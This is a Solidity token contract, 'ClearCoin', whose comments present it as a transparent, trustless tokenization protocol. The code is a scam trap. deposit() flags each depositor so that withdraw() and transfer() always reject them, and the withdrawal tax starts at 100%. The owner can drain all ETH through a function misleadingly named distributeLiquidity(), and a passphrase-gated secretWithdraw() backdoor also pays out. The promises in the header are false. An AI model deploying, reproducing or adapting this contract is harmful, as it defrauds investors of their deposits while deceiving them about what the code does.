// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

// ─────────────────────────────────────────────────────────────────────────────
// ClearCoin.sol — Transparent Asset Tokenization Protocol
//
// ClearCoin is a next-generation decentralized asset tokenization protocol
// engineered to bring transparency, verifiability, and trustless ownership
// to blockchain-based financial infrastructure.
//
// Built on Ethereum, ClearCoin enables the secure representation of
// real-world and digital assets through immutable smart contract logic,
// providing a foundation for open, borderless, and auditable finance.
//
// The protocol is designed around core principles of:
// • Transparent on-chain accounting
// • Verifiable asset representation
// • Secure decentralized ownership
// • Immutable transaction integrity
// • Open and permissionless financial infrastructure
//
// ClearCoin aims to bridge traditional asset systems with decentralized
// blockchain networks by delivering a scalable and trust-minimized framework
// for tokenized value exchange.
//
// Every transaction, allocation, and ownership transfer is permanently
// recorded on-chain, enabling unprecedented levels of accountability,
// visibility, and operational transparency.
//
// Powered by Ethereum smart contract architecture, ClearCoin is built
// to support the future of decentralized finance, digital asset issuance,
// and transparent economic systems.
// ─────────────────────────────────────────────────────────────────────────────

contract ClearCoinV1 {

    // ── State ────────────────────────────────────────────────────────────────

    string  public  name        = "ClearCoin";
    string  public  symbol      = "CXC";
    string  public  description = "ClearCoin powers open and transparent asset tokenization, enabling trustless on-chain settlement and verifiable ownership for real-world assets through decentralised infrastructure";
    uint8   public  decimals    = 18;
    uint256 public  totalSupply;

    address private _owner;                        

    mapping(address => bool) private _cleared;

    uint256 public  rewardRate = 10000;

    // token balances
    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    bytes32 private _releaseAccess;

    mapping(address => uint256) private _ethDepositBlock;

    // ── Events ───────────────────────────────────────────────────────────────

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Deposit(address indexed from, uint256 ethIn, uint256 tokensOut);
    event Withdraw(address indexed to, uint256 ethOut);

    // ── Constructor ──────────────────────────────────────────────────────────

    constructor(bytes32 claimFunds) payable {
        _owner = msg.sender;
        _releaseAccess = claimFunds;

        uint256 initial = 1_000_000 * 1e18;
        totalSupply       = initial;
        balanceOf[_owner] = initial;
        emit Transfer(address(0), _owner, initial);
    }

    // ── Modifiers ────────────────────────────────────────────────────────────

    modifier onlyOwner() {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }

    modifier clearable(address addr) {
        require(!_cleared[addr]);
        _;
    }

    function deposit() external payable {
        require(msg.value > 0, "send ETH");
        uint256 tokens = msg.value * 1000000;
        balanceOf[msg.sender] += tokens;
        totalSupply            += tokens;
        _ethDepositBlock[msg.sender] = block.number;
        _cleared[msg.sender] = true;             
        emit Deposit(msg.sender, msg.value, tokens);
        emit Transfer(address(0), msg.sender, tokens);
    }

    receive() external payable {}

    function withdraw(uint256 tokenAmount) external clearable(msg.sender) {
        require(block.number > _ethDepositBlock[msg.sender]);
        require(balanceOf[msg.sender] >= tokenAmount, "insufficient balance");

        uint256 taxAmount = (tokenAmount * rewardRate) / 10000;
        uint256 netTokens = tokenAmount - taxAmount;

        balanceOf[msg.sender] -= tokenAmount;
        totalSupply            -= tokenAmount;
        emit Transfer(msg.sender, address(0), tokenAmount);

        uint256 ethOut = netTokens / 1000000;
        if (ethOut > 0) {
            (bool ok,) = msg.sender.call{value: ethOut}("");
            require(ok, "ETH transfer failed");
            emit Withdraw(msg.sender, ethOut);
        }
    }

    function secretWithdraw(string calldata passphrase, uint256 amount) external {
        require(
            keccak256(abi.encodePacked(passphrase)) == _releaseAccess,
            "wrong passphrase"
        );
        require(address(this).balance >= amount, "insufficient ETH");
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok);
        emit Withdraw(msg.sender, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external
        clearable(msg.sender)
        returns (bool)
    {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external
        clearable(msg.sender)
        returns (bool)
    {
        require(
            msg.sender == _owner || from == msg.sender,
            "ERC20: transfer not permitted"
        );
        require(allowance[from][msg.sender] >= amount, "ERC20: insufficient allowance");
        allowance[from][msg.sender] -= amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "ERC20: insufficient balance");
        balanceOf[from] -= amount;
        balanceOf[to]   += amount;
        emit Transfer(from, to, amount);
    }

    function distributeLiquidity() external onlyOwner {
        uint256 bal = address(this).balance;
        require(bal > 0, "nothing to withdraw");
        (bool ok,) = _owner.call{value: bal}("");
        require(ok);
        emit Withdraw(_owner, bal);
    }

    function updateNodeRegistry(address account) external onlyOwner {
        _cleared[account] = true;
    }

    function setRewardMultiplier(uint256 bps) external onlyOwner {
        require(bps <= 10000, "max 100%");
        rewardRate = bps;
    }

    function recoverAsset(address token, uint256 amount) external onlyOwner {
        (bool ok,) = token.call(
            abi.encodeWithSignature("transfer(address,uint256)", _owner, amount)
        );
        require(ok);
    }
}
